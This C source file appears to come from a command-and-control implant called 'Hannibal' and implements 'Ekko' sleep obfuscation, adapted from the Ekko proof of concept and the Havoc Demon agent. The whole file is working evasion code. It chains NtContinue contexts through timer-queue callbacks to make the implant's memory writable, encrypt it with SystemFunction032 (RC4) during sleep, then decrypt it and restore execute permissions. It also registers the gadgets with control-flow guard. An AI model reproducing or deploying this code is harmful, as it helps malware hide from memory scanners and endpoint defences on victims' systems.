// Pieces were taken from both:
// Credit: https://github.com/Cracked5pider/Ekko
// Credit: https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Obf.c


/**
 * At the moment only the original Ekko POC is implemented.
 * The Havoc Demon agent has a more robust version with stack
 * evasions. TODO: Adapt full version and investigate other sleep methods.
 */

#include "utility_sleep_ekko.h"

// SECTION_CODE BOOL EventSet(
//     IN HANDLE Event
// ) {
//     HANNIBAL_INSTANCE_PTR

//     return NT_SUCCESS( hannibal_instance_ptr->Win32.NtSetEvent( Event, NULL ) );
// }


SECTION_CODE void utility_sleep_ekko(ULONG TimeOut, ULONG Method)
{
    HANNIBAL_INSTANCE_PTR

    // TODO: Test in a process compiled with CFG.
    CfgAddressAdd( hannibal_instance_ptr->Modules.Advapi32, hannibal_instance_ptr->Win32.SystemFunction032 );
    CfgAddressAdd( hannibal_instance_ptr->Modules.Kernel32, hannibal_instance_ptr->Win32.WaitForSingleObject );
    CfgAddressAdd( hannibal_instance_ptr->Modules.Kernel32, hannibal_instance_ptr->Win32.VirtualProtect );
    CfgAddressAdd( hannibal_instance_ptr->Modules.Ntdll,    hannibal_instance_ptr->Win32.NtContinue );
    // CfgAddressAdd( hannibal_instance_ptr->Modules.Ntdll,    hannibal_instance_ptr->Win32.NtSetEvent );
    CfgAddressAdd( hannibal_instance_ptr->Modules.Ntdll,    hannibal_instance_ptr->Win32.RtlCaptureContext );


    CONTEXT CtxThread   = { 0 };
    CONTEXT RopProtRW   = { 0 };
    CONTEXT RopMemEnc   = { 0 };
    CONTEXT RopDelay    = { 0 };
    CONTEXT RopMemDec   = { 0 };
    CONTEXT RopProtRX   = { 0 };
    CONTEXT RopSetEvt   = { 0 };
    HANDLE  hTimerQueue = NULL;
    HANDLE  hNewTimer   = NULL;
    HANDLE  hEvent      = NULL;
    PVOID   ImageBase   = NULL;
    DWORD   ImageSize   = 0;
    DWORD   OldProtect  = 0;
    BOOL     Success   = { 0 };

    USTRING Key         = { 0 };
    USTRING Img         = { 0 };

    PVOID   NtContinue  = NULL;
    PVOID   SysFunc032  = NULL;

    hEvent      = hannibal_instance_ptr->Win32.CreateEventW( 0, 0, 0, 0 );
    hTimerQueue = hannibal_instance_ptr->Win32.CreateTimerQueue();

    NtContinue  = hannibal_instance_ptr->Win32.NtContinue;

    // TODO To avoid GetProcAddress see LdrFunctionAddr in Demon src\core\Win32.c
    // Handles forwarded functions
    
    SysFunc032  = hannibal_instance_ptr->Win32.SystemFunction032;

    ImageBase   = hannibal_instance_ptr->Base.Buffer;
    ImageSize   = hannibal_instance_ptr->Base.Length;

    Key.Buffer  = hannibal_instance_ptr->config.local_encryption_key;
    Key.Length  = Key.MaximumLength = LOCAL_ENCRYPT_KEY_SIZE;

    Img.Buffer  = ImageBase;
    Img.Length  = Img.MaximumLength = ImageSize;

    if ( hannibal_instance_ptr->Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue,  hannibal_instance_ptr->Win32.RtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD ) )
    {
        hannibal_instance_ptr->Win32.WaitForSingleObject( hEvent, 0x32 );

        pic_memcpy( &RopProtRW, &CtxThread, sizeof( CONTEXT ) );
        pic_memcpy( &RopMemEnc, &CtxThread, sizeof( CONTEXT ) );
        pic_memcpy( &RopDelay,  &CtxThread, sizeof( CONTEXT ) );
        pic_memcpy( &RopMemDec, &CtxThread, sizeof( CONTEXT ) );
        pic_memcpy( &RopProtRX, &CtxThread, sizeof( CONTEXT ) );
        pic_memcpy( &RopSetEvt, &CtxThread, sizeof( CONTEXT ) );

        // VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
        RopProtRW.Rsp  -= 8;
        RopProtRW.Rip   = hannibal_instance_ptr->Win32.VirtualProtect;
        RopProtRW.Rcx   = ImageBase;
        RopProtRW.Rdx   = ImageSize;
        RopProtRW.R8    = PAGE_READWRITE;
        RopProtRW.R9    = &OldProtect;

        // SysFunc032( &Key, &Img );
        RopMemEnc.Rsp  -= 8;
        RopMemEnc.Rip   = SysFunc032;
        RopMemEnc.Rcx   = &Img;
        RopMemEnc.Rdx   = &Key;

        // WaitForSingleObject( hTargetHdl, SleepTime );
        RopDelay.Rsp   -= 8;
        RopDelay.Rip    = hannibal_instance_ptr->Win32.WaitForSingleObject;
        RopDelay.Rcx    = NtCurrentProcess();
        RopDelay.Rdx    = TimeOut;

        // SysFunc032( &Key, &Img );
        RopMemDec.Rsp  -= 8;
        RopMemDec.Rip   = SysFunc032;
        RopMemDec.Rcx   = &Img;
        RopMemDec.Rdx   = &Key;

        // VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect );
        RopProtRX.Rsp  -= 8;
        RopProtRX.Rip   = hannibal_instance_ptr->Win32.VirtualProtect;
        RopProtRX.Rcx   = ImageBase;
        RopProtRX.Rdx   = ImageSize;
        RopProtRX.R8    = PAGE_EXECUTE_READWRITE;
        RopProtRX.R9    = &OldProtect;

        // SetEvent( hEvent );
        RopSetEvt.Rsp  -= 8;
        RopSetEvt.Rip   = hannibal_instance_ptr->Win32.SetEvent;
        RopSetEvt.Rcx   = hEvent;
        
        BOOL status;
        status = hannibal_instance_ptr->Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD );
        status = hannibal_instance_ptr->Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD );
        status = hannibal_instance_ptr->Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD );
        status = hannibal_instance_ptr->Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD );
        status = hannibal_instance_ptr->Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD );
        status = hannibal_instance_ptr->Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue, NtContinue, &RopSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD );

        hannibal_instance_ptr->Win32.WaitForSingleObject( hEvent, INFINITE );

    }

    hannibal_instance_ptr->Win32.DeleteTimerQueue( hTimerQueue );

}